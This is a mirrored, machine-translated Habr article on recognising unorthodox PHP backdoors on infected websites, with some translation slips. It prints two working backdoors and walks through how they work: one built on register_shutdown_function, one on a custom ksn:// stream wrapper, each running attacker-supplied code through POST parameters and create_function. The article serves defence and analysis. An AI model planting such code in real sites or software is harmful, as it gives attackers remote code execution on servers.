<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Recognize and neutralize. Search for unorthodox backdoors</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="According to our calculations, in 72% of the infected sites, hidden back-end administration programs are used - backdoors. With their help, fraudsters...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Recognize and neutralize. Search for unorthodox backdoors</h1><div class="post__text post__text-html js-mediator-article">  According to our calculations, in 72% of the infected sites, hidden back-end administration programs are used - backdoors.  With their help, fraudsters get remote access to your site, and of course, this threatens the owner: receiving and transmitting confidential user data, launching malicious programs, destroying information, and so on. <br><br><img src="https://habrastorage.org/web/be6/884/58e/be688458e4af4ea1a0aeec7ae0d687a3.png"><br><a name="habracut"></a><br>  From time to time, one encounters unique backdoors that do not include the usual PHP functions, such as eval, create_function, preg_replace, assert, base64_decode, etc. <br><br>  Such backdoors often look like source code without any obfuscation, no encrypted strings, string concatenation, formatting the program code, or changing its structure.  However, these backdoors still allow an attacker to run arbitrary code on your server. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h3>  Backdoor and Shutdown Function </h3><br>  Let's start with the simple.  The comment in the file says that this is @package win.error.Libraries with the function: <br><br><pre><code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">win</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ register_shutdown_function($_POST[<span class="hljs-string"><span class="hljs-string">'d'</span></span>](<span class="hljs-string"><span class="hljs-string">''</span></span>, $_POST[<span class="hljs-string"><span class="hljs-string">'f'</span></span>]($_POST[<span class="hljs-string"><span class="hljs-string">'c'</span></span>]))); }</code> </pre> <br>  In this case, we consider $ _POST as something suspicious.  But is this really malicious code? <br><br>  <a href="http://php.net/manual/en/function.register-shutdown-function.php">register_shutdown_function</a> registers a function that will be executed upon completion of the script.  Therefore, regardless of the code that you see in the script, after its completion, the callback function from the register_shutdown_function function will be executed. <br><br>  The function executed after the script will look like this: <br><br><pre> <code class="php hljs">$_POST[<span class="hljs-string"><span class="hljs-string">'d'</span></span>](<span class="hljs-string"><span class="hljs-string">''</span></span>, $_POST[<span class="hljs-string"><span class="hljs-string">'f'</span></span>]($_POST[<span class="hljs-string"><span class="hljs-string">'c'</span></span>]))</code> </pre> <br>  In any case, the code looks mysterious.  Let's look at it through the eyes of a hacker and assume that they have activated a script with the following POST parameters: <br><br>  d = create_function <br>  e = base64_decode <br>  c = some_base64_encoded_malicious_PHP_code <br><br>  We get the following: <br><br><pre> <code class="php hljs">create_function(<span class="hljs-string"><span class="hljs-string">''</span></span>, base64_decode(some_base64_encoded_malicious_PHP_code))</code> </pre><br>  Now it looks like a regular backdoor.  This code does not require an additional call, since register_shutdown_function registers a callback function, which will be automatically executed after the script has completed. <br><br><h3>  Backdoor and Stream Wrapper </h3><br>  Now let's complicate the task of recognizing backdoors. <br><br>  Before us is a comment - @package Stream.ksn.Libraries, which means that the file contains the Stream class and a function for working with stream_wrapper_register, which registers the wrapper using the ksn protocol. <br><br><pre> <code class="php hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Stream</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stream_open</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($path, $mode, $options, &amp;$opened_path)</span></span></span><span class="hljs-function"> </span></span>{ $url = parse_url($path); $f = $_POST[<span class="hljs-string"><span class="hljs-string">'d'</span></span>](<span class="hljs-string"><span class="hljs-string">''</span></span>, $url[<span class="hljs-string"><span class="hljs-string">"host"</span></span>]); $f(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; } } stream_wrapper_register(<span class="hljs-string"><span class="hljs-string">"ksn"</span></span>, <span class="hljs-string"><span class="hljs-string">"Stream"</span></span>); <span class="hljs-comment"><span class="hljs-comment">// Register connect the library Stream $fp = fopen('ksn://'.$_POST['f']($_POST['c']), '');</span></span></code> </pre> <br>  And now, in order.  For site owners and some webmasters, this code looks legitimate - typical files in content management systems or third-party plug-ins - perhaps it‚Äôs not quite clear what he does and what he does, but if he does, he probably needs it and is useful.  Does anyone know what ksn streams are? <br><br>  But hey - we see that in the code there are POST-data.  But this is already suspicious, since the POST parameters can be controlled by intruders.  It is not entirely clear what POST data is used in this code.  Let's play cryptographers and use decoding technique, replace letters in the phrase. <br><br>  Let's start with this part of the code from the stream_open function: <br><br><pre> <code class="php hljs">$f = $_POST[<span class="hljs-string"><span class="hljs-string">'d'</span></span>](<span class="hljs-string"><span class="hljs-string">''</span></span>, $url[<span class="hljs-string"><span class="hljs-string">"host"</span></span>]);</code> </pre> <br>  Suspiciously when the POST parameter is used as the function name.  The code assumes that the value of $ _POST ['d'] can be create_function.  If so, then $ url ["host"] contains some executable code, but the $ url variable parses the URL and returns its components using the standard PHP parse_url function.  This means that $ url ["host"] is only part of the host portion of the URL path. <br><br>  I doubt that the domain name may contain executable PHP code ... right? <br><br>  Let's check out where we get the $ path parameter in function stream_open: in theory, it will contain the parsed URL obtained using the parse_url function.  To find out, consider this part of the code: <br><br><pre> <code class="php hljs">stream_wrapper_register(<span class="hljs-string"><span class="hljs-string">"ksn"</span></span>, <span class="hljs-string"><span class="hljs-string">"Stream"</span></span>);</code> </pre> <br>  The <a href="http://php.net/manual/ru/function.stream-wrapper-register.php">stream_wrapper_register</a> function registers the ksn protocol and the Stream class that will work with this protocol.  The Stream class follows the condition of the streamWrapper prototype, namely streamWrapper :: stream_open - opens the file or URL, and will be called immediately after the protocol initialization. <br><br>  stream_open should follow the description, where $ path is the URL passed to fopen (), which assigns the named resource specified in the filename argument to the stream: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> bool streamWrapper::stream_open ( string $path , string $mode , int $options , string &amp;$opened_path )</code> </pre> <br>  In our case, fopen opens the URL ksn: //: <br><br><pre> <code class="php hljs">$fp = fopen(<span class="hljs-string"><span class="hljs-string">'ksn://'</span></span>.$_POST[<span class="hljs-string"><span class="hljs-string">'f'</span></span>]($_POST[<span class="hljs-string"><span class="hljs-string">'c'</span></span>]), <span class="hljs-string"><span class="hljs-string">''</span></span>);</code> </pre> <br>  As a result, $ path is the string: 'ksn: //'.$_POST [' f '] ($ _POST [' c ']),' <br><br>  This will create a URL in which the host part is the malicious PHP code being executed. <br><br>  Is it possible to create a domain name or IP address, which will actually be a full-fledged PHP code for website attack?  The parse_url function does not check URLs for correctness, but simply breaks them apart.  Everything from: // to the first slash (/) or colon (:) is considered the main part of the URL. <br><br>  For example, if you specify the parse_url function: ksn: // eval (base64_decode ($ _POST ["code"]));  The main part of the URL will be returned: eval (base64_decode ($ _ POST ["code"])); <br><br>  Following the logic of the backdoor, we get the following POST parameters: <br><br>  e = base64_decode <br>  c = some_base64_encoded_malicious_PHP_code <br><br>  In this case, the wording fopen looks like this: <br><br><pre> <code class="php hljs">$fp = fopen(<span class="hljs-string"><span class="hljs-string">'ksn://base64_decode(base64_encoded_malicious_PHP_code)'</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>);</code> </pre> <br>  Now, back to the stream_open function, this will be the last piece of the puzzle.  Now we know which URL can be passed to the fopen function file: <br><br><pre> <code class="php hljs">$f = $_POST[<span class="hljs-string"><span class="hljs-string">'d'</span></span>](<span class="hljs-string"><span class="hljs-string">''</span></span>, $url[<span class="hljs-string"><span class="hljs-string">"host"</span></span>]);</code> </pre> <br>  And the pants turn, the pants turn into an elegant line: <br><br><pre> <code class="php hljs">$f = create_function(<span class="hljs-string"><span class="hljs-string">''</span></span>, base64_decode(base64_encoded_malicious_PHP_code));</code> </pre> <br>  The next line just executes the backdoor code: <br><br><pre> <code class="php hljs">$f();</code> </pre> <br>  In other words, all that is required to execute the backdoor code is to call the fopen () function with the generated ksn: // URL. <br><br>  The above was an example of how attackers could use the less well-known PHP functions to create vulnerabilities.  Considering that there are thousands of PHP files on a typical web site, you can hardly check each file carefully.  Because the search for malware on the site - the task is not entirely simple.  You can‚Äôt rely only on manual code checking and simple scripts that scan known malware patterns. <br><br>  <b>As advertising.</b>  Stock!  Only now get <b><a href="https://ua-hosting.company/vpsnl">up to 4 months of free use of VPS (KVM) with dedicated drives in the Netherlands and the USA</a> (configurations from VPS (KVM) - E5-2650v4 (6 Cores) / 10GB DDR4 / 240GB SSD or 4TB HDD / 1Gbps 10TB - $ 29 / month and above, options with RAID1 and RAID10 are available)</b> , a full-fledged analogue of dedicated servers, when ordering for a period of 1-12 months, the <a href="http://searchengines.guru/showthread.php%3Ft%3D964358">conditions of the promotion are here,</a> existing subscribers can receive a 2-month bonus! <br><br>  <a href="https://habrahabr.ru/company/ua-hosting/blog/329618/">How to build the infrastructure of the building.</a>  <a href="https://habrahabr.ru/company/ua-hosting/blog/329618/">class c using servers Dell R730xd E5-2650 v4 worth 9000 euros for a penny?</a> </div><p>Source: <a href="https://habr.com/ru/post/335392/">https://habr.com/ru/post/335392/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../335382/index.html">Misconceptions Clean Architecture</a></li>
<li><a href="../335384/index.html">New championship for backend-developers: HighLoad Cup</a></li>
<li><a href="../335386/index.html">Asynchronous circuit study in ModelSim</a></li>
<li><a href="../335388/index.html">Codota: using AI to improve code</a></li>
<li><a href="../335390/index.html">1C-like interpreter on Go</a></li>
<li><a href="../335394/index.html">School of Data: we have done better</a></li>
<li><a href="../335398/index.html">Electronic voting protocol: my version</a></li>
<li><a href="../335400/index.html">Good code is our best documentation.</a></li>
<li><a href="../335402/index.html">Free network security audit with Fortinet. Part 2</a></li>
<li><a href="../335404/index.html">How I started to create a text MMO RPG</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>